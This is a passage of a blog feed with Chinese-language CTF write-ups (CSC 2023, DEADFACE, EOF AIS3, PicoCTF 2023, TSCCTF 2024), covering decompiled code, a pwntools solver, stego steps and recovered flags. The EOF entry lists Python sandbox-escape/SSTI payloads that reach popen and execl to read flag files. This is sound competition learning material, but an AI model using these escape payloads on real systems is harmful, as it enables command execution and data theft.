&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">=&lt;/span> v18 &lt;span style="color:#f92672">+&lt;/span> v17;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">96&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v21 &lt;span style="color:#f92672">=&lt;/span> v20 &lt;span style="color:#f92672">+&lt;/span> v19;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">192&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23 &lt;span style="color:#f92672">=&lt;/span> v22 &lt;span style="color:#f92672">+&lt;/span> v21;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">65&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;8&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> v23;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">97&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;5&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> v26 &lt;span style="color:#f92672">+&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">160&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> v28 &lt;span style="color:#f92672">+&lt;/span> v27;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">128&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> v30 &lt;span style="color:#f92672">+&lt;/span> v29;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">161&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> v32 &lt;span style="color:#f92672">+&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">193&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> v34 &lt;span style="color:#f92672">+&lt;/span> v33;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">225&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v44 &lt;span style="color:#f92672">=&lt;/span> v35 &lt;span style="color:#f92672">+&lt;/span> v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">+=&lt;/span> v35 &lt;span style="color:#f92672">+&lt;/span> v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>v47;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v47 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Stage 2: Predict the final card I draw.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(flag, &lt;span style="color:#ae81ff">32LL&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)isACard((&lt;span style="color:#66d9ef">__int64&lt;/span>)flag)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)j_strlen_ifunc(flag) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> flag[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> flag[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;Congrats! Here is your flag: &amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, v38, v39, v40, v41, flag[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> readFlag();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You failed.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You failed.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>CSC 2023 決賽</title><link>https://bernie6401.github.io/docs/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/</guid><description>&lt;h1 id="csc-ctf-2023-決賽">
 CSC CTF 2023 決賽
 &lt;a class="anchor" href="#csc-ctf-2023-%e6%b1%ba%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;p>隊伍名稱: 名字好難想RRRRRRRRRRRRRRR&lt;/p>
&lt;h2 id="教學題">
 教學題
 &lt;a class="anchor" href="#%e6%95%99%e5%ad%b8%e9%a1%8c">#&lt;/a>
&lt;/h2>
&lt;h3 id="q4">
 Q4
 &lt;a class="anchor" href="#q4">#&lt;/a>
&lt;/h3>
&lt;h4 id="題目敘述">
 題目敘述
 &lt;a class="anchor" href="#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>成為「admin」並取得Flag&lt;/p>
&lt;p>[連線IP/連結資訊]
http://192.168.100.71&lt;/p>
&lt;p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}&lt;/p>&lt;/blockquote>
&lt;h4 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h4>
&lt;p>這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄
學長自述:&lt;/p>
&lt;h3 id="q5">
 Q5
 &lt;a class="anchor" href="#q5">#&lt;/a>
&lt;/h3>
&lt;h4 id="題目敘述-1">
 題目敘述
 &lt;a class="anchor" href="#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-1">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!&lt;/p>
&lt;p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}&lt;/p>&lt;/blockquote>
&lt;h4 id="exploit-1">
 Exploit
 &lt;a class="anchor" href="#exploit-1">#&lt;/a>
&lt;/h4>
&lt;p>測驗智商用的，直接pwntools就可以了&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from pwn import *

r = process(&amp;#39;./Bomb.exe&amp;#39;)
r.recvuntil(b&amp;#39;P1ease count A(&amp;#39;)
A = r.recvuntil(b&amp;#39;)&amp;#39;)[:-1].decode()
sign = r.recv(3).decode()
B = r.recvline()[2:-2].decode()

log.info(f&amp;#39;A({A}) {sign} B({B}) = {eval(A + sign + B)}&amp;#39;)
r.sendlineafter(b&amp;#39;Enter your answer: &amp;#39;, str(eval(A + sign + B)).encode())

r.interactive()
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ python exp.py
[+] Starting local process &amp;#39;./Bomb.exe&amp;#39;: pid 8143
[*] A(1507886) + B(7372399) = 8880285
[*] Switching to interactive mode

Good job!\(^^)/
CSC{FLAG_54v3th3d4y7777777}Time&amp;#39;s up! (っ•O•)╮ =͟͟͞͞●~*
[*] Got EOF while reading in interactive
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>CSC{FLAG_54v3th3d4y7777777}&lt;/code>&lt;/p></description></item><item><title>DEADFACE CTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/deadface-ctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/deadface-ctf-2023/</guid><description>&lt;h1 id="deadface-ctf-2023">
 DEADFACE CTF 2023
 &lt;a class="anchor" href="#deadface-ctf-2023">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler 比賽成果
&lt;img src="https://hackmd.io/_uploads/BkhuIH1QT.png" alt="" />
:::&lt;/p>
&lt;h2 id="steganography">
 Steganography
 &lt;a class="anchor" href="#steganography">#&lt;/a>
&lt;/h2>
&lt;h3 id="youve-been-ransomwared">
 You&amp;rsquo;ve Been Ransomwared
 &lt;a class="anchor" href="#youve-been-ransomwared">#&lt;/a>
&lt;/h3>
&lt;h4 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>DEADFACE is taunting GlitterCo with their latest ransomware attack. According to our intel, the attackers like to leave a calling card in their attacks. If we can figure out which DEADFACE actor executed this attack, we might be able to figure out a way around paying. Can you find anything in this screenshot that might point to which attacker ran this ransomware attack?&lt;/p></description></item><item><title>EOF AIS3 Final</title><link>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/eof-ais3-final/</guid><description>&lt;h1 id="eof-ais3-final">
 EOF AIS3 Final
 &lt;a class="anchor" href="#eof-ais3-final">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-ais3">
 tags: &lt;code>CTF&lt;/code> &lt;code>AIS3&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-ais3">#&lt;/a>
&lt;/h6>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/">https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html">https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md">https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md&lt;/a>&lt;/p>
&lt;p>SSTI: &lt;a href="https://www.freebuf.com/articles/network/258136.html">https://www.freebuf.com/articles/network/258136.html&lt;/a>
&lt;a href="https://www.compart.com/en/unicode/U&amp;#43;FF5B">https://www.compart.com/en/unicode/U+FF5B&lt;/a>
&lt;a href="https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection">https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection&lt;/a>&lt;/p>
&lt;p>Payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;))

file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))

file = &amp;#39;FLAG.TXT&amp;#39;
command = &amp;#39;EXECL&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))


file = &amp;#39;FLAG.TXT&amp;#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower()))
&lt;/code>&lt;/pre>&lt;h2 id="script---run_scriptpy">
 Script - run_script.py
 &lt;a class="anchor" href="#script---run_scriptpy">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import subprocess
import time
import multiprocessing as mp


def cycle(i):
 subprocess.call([&amp;#39;python&amp;#39;, &amp;#39;script.py&amp;#39;, &amp;#39;--team&amp;#39;, str(i)])

if __name__ == &amp;#34;__main__&amp;#34;:
 p1 = mp.Process(target=cycle, args=(&amp;#39;1&amp;#39;,))
 p2 = mp.Process(target=cycle, args=(&amp;#39;2&amp;#39;,))
 # p3 = mp.Process(target=cycle, args=(&amp;#39;3&amp;#39;,))
 # p4 = mp.Process(target=cycle, args=(&amp;#39;4&amp;#39;,))
 # p5 = mp.Process(target=cycle, args=(&amp;#39;5&amp;#39;,))
 # p7 = mp.Process(target=cycle, args=(&amp;#39;7&amp;#39;,))
 # p8 = mp.Process(target=cycle, args=(&amp;#39;8&amp;#39;,))
 # p9 = mp.Process(target=cycle, args=(&amp;#39;9&amp;#39;,))
 # p10 = mp.Process(target=cycle, args=(&amp;#39;10&amp;#39;,))
 # p11 = mp.Process(target=cycle, args=(&amp;#39;11&amp;#39;,))
 # p12 = mp.Process(target=cycle, args=(&amp;#39;12&amp;#39;,))
 # p13 = mp.Process(target=cycle, args=(&amp;#39;13&amp;#39;,))
 # p14 = mp.Process(target=cycle, args=(&amp;#39;14&amp;#39;,))
 # p15 = mp.Process(target=cycle, args=(&amp;#39;15&amp;#39;,))
 # p16 = mp.Process(target=cycle, args=(&amp;#39;16&amp;#39;,))
 # p17 = mp.Process(target=cycle, args=(&amp;#39;17&amp;#39;,))
 # p18 = mp.Process(target=cycle, args=(&amp;#39;18&amp;#39;,))
 # p19 = mp.Process(target=cycle, args=(&amp;#39;19&amp;#39;,))
 # p20 = mp.Process(target=cycle, args=(&amp;#39;20&amp;#39;,))
 # p21 = mp.Process(target=cycle, args=(&amp;#39;21&amp;#39;,))
 # p22 = mp.Process(target=cycle, args=(&amp;#39;22&amp;#39;,))
 # p23 = mp.Process(target=cycle, args=(&amp;#39;23&amp;#39;,))
 # p24 = mp.Process(target=cycle, args=(&amp;#39;24&amp;#39;,))
 

 p1.start()
 time.sleep(2)
 p2.start()
 time.sleep(2)
 # p3.start()
 # p4.start()
 # p5.start()
 # p7.start()
 # p8.start()
 # p9.start()
 # p10.start()
 # p11.start()
 # p12.start()
 # p13.start()
 # p14.start()
 # p15.start()
 # p16.start()
 # p17.start()
 # p18.start()
 # p19.start()
 # p20.start()
 # p21.start()
 # p22.start()
 # p23.start()
 # p24.start()

 p1.join()
 p2.join()
 # p3.join()
 # p4.join()
 # p5.join()
 # p7.join()
 # p8.join()
 # p9.join()
 # p10.join()
 # p11.join()
 # p12.join()
 # p13.join()
 # p14.join()
 # p15.join()
 # p16.join()
 # p17.join()
 # p18.join()
 # p19.join()
 # p20.join()
 # p21.join()
 # p22.join()
 # p23.join()
 # p24.join()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/picoctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/picoctf-2023/</guid><description>&lt;h1 id="picoctf-2023">
 PicoCTF 2023
 &lt;a class="anchor" href="#picoctf-2023">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="crypto">
 Crypto
 &lt;a class="anchor" href="#crypto">#&lt;/a>
&lt;/h2>
&lt;h3 id="hidetosee">
 HideToSee
 &lt;a class="anchor" href="#hidetosee">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>這一題比較像是Misc題目，比賽的時候想了很久都沒進展，賽後看了&lt;a href="https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Cryptography/HideToSee/HideToSee.md">write up&lt;/a>才覺得異常簡單，當初應該也是有往這方面想，但沒有用steghide&lt;/p>
&lt;h4 id="exploit---steghide--atbash">
 Exploit - Steghide + Atbash
 &lt;a class="anchor" href="#exploit---steghide--atbash">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>先用steghide解密出隱藏的文檔
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ steghide extract -sf atbash.jpg
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>用&lt;a href="https://www.dcode.fr/atbash-cipher">online tool&lt;/a>解密
&lt;img src="https://hackmd.io/_uploads/rJQVLEnPn.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h3 id="reverse-1">
 Reverse
 &lt;a class="anchor" href="#reverse-1">#&lt;/a>
&lt;/h3>
&lt;p>IDA
Flag: &lt;code>picoCTF{3lf_r3v3r5ing_succe55ful_8108250b}&lt;/code>&lt;/p>
&lt;h3 id="safe-opener-2">
 Safe Opener 2
 &lt;a class="anchor" href="#safe-opener-2">#&lt;/a>
&lt;/h3>
&lt;p>Strings search
Flag: &lt;code>picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_ccb5525e}&lt;/code>&lt;/p>
&lt;h3 id="timer">
 timer
 &lt;a class="anchor" href="#timer">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;code>mobsf&lt;/code>
Flag: &lt;code>picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}&lt;/code>&lt;/p>
&lt;h3 id="ready-gladiator-0">
 Ready Gladiator 0
 &lt;a class="anchor" href="#ready-gladiator-0">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>???&lt;/li>
&lt;li>&lt;code>picoCTF{h3r0_t0_z3r0_4m1r1gh7_a220a377}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="forensics">
 Forensics
 &lt;a class="anchor" href="#forensics">#&lt;/a>
&lt;/h2>
&lt;h3 id="hideme">
 hideme
 &lt;a class="anchor" href="#hideme">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;code>binwalk&lt;/code> to observe that it should be a &lt;code>zip&lt;/code> file.&lt;/p></description></item><item><title>TSCCTF 2024</title><link>https://bernie6401.github.io/docs/security/competition/tscctf-2024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/tscctf-2024/</guid><description>&lt;h1 id="tscctf-2024">
 TSCCTF 2024
 &lt;a class="anchor" href="#tscctf-2024">#&lt;/a>
&lt;/h1>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BJLmu63Y6.png" alt="image" />&lt;/p>
&lt;h2 id="misc">
 Misc
 &lt;a class="anchor" href="#misc">#&lt;/a>
&lt;/h2>
&lt;h3 id="aka">
 AKA
 &lt;a class="anchor" href="#aka">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler IDA&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">__int64 flag_function()
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]

 num_of_files = 0;
 sub_14000A6C0();
 here_dll = LoadLibraryA(&amp;#34;here.dll&amp;#34;);
 flag_dll = LoadLibraryA(&amp;#34;flag.dll&amp;#34;);
 ghost_dll = LoadLibraryA(&amp;#34;ghost.dll&amp;#34;);
 strcpy(FileName, &amp;#34;.\\*.*&amp;#34;);
 FirstFileA = FindFirstFileA(FileName, &amp;amp;FindFileData);
 while ( FindNextFileA(FirstFileA, &amp;amp;FindFileData) )
 {
 while ( *(_WORD *)FindFileData.cFileName != 46
 &amp;amp;&amp;amp; (*(_WORD *)FindFileData.cFileName != 11822 || FindFileData.cFileName[2]) )
 {
 num_of_files += (GetFileAttributesA(FindFileData.cFileName) &amp;amp; 0x10) == 0;
 if ( !FindNextFileA(FirstFileA, &amp;amp;FindFileData) )
 goto LABEL_6;
 }
 }
LABEL_6:
 FindClose(FirstFileA);
 if ( num_of_files &amp;gt; 2 )
 {
 v6 = strcpy(buf, &amp;#34;We don&amp;#39;t want too many files here.&amp;#34;);
 puts(v6);
 v7 = strcpy(buf, &amp;#34;Files &amp;lt;= 2. You have &amp;#34;);
 v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files);
 v9 = strcpy(v8, &amp;#34; file(s).&amp;#34;);
 puts(v9);
 v10 = strcpy(buf, &amp;#34;Hint: Did you have short name?&amp;#34;);
 puts(v10);
 return 0i64;
 }
 if ( !here_dll )
 {
 if ( !ghost_dll )
 {
 if ( !flag_dll )
 {
 v12 = strcpy(buf, &amp;#34;DLL load failed.&amp;#34;);
 puts(v12);
 goto LABEL_12;
 }
 hint = (void (*)(void))GetProcAddress(flag_dll, &amp;#34;hint&amp;#34;);
 if ( !hint )
 goto LABEL_12;
 goto LABEL_11;
 }
 goto LABEL_16;
 }
 if ( ghost_dll )
 {
LABEL_16:
 hint = (void (*)(void))GetProcAddress(ghost_dll, &amp;#34;Roflcopter&amp;#34;);
 if ( !hint )
 goto LABEL_12;
 goto LABEL_11;
 }
 if ( !flag_dll )
 {
 hint = (void (*)(void))GetProcAddress(here_dll, &amp;#34;hint&amp;#34;);
 if ( !hint )
 {
LABEL_12:
 FreeLibrary(here_dll);
 FreeLibrary(flag_dll);
 FreeLibrary(ghost_dll);
 return 0i64;
 }
LABEL_11:
 hint();
 goto LABEL_12;
 }
 flag = (void (*)(void))GetProcAddress(flag_dll, &amp;#34;flag&amp;#34;);
 if ( flag )
 flag();
 return 0i64;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>神盾盃2023初賽</title><link>https://bernie6401.github.io/docs/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="神盾盃2023初賽">
 神盾盃2023初賽
 &lt;a class="anchor" href="#%e7%a5%9e%e7%9b%be%e7%9b%832023%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;h2 id="jail1">
 Jail1
 &lt;a class="anchor" href="#jail1">#&lt;/a>
&lt;/h2>
&lt;h3 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h3>
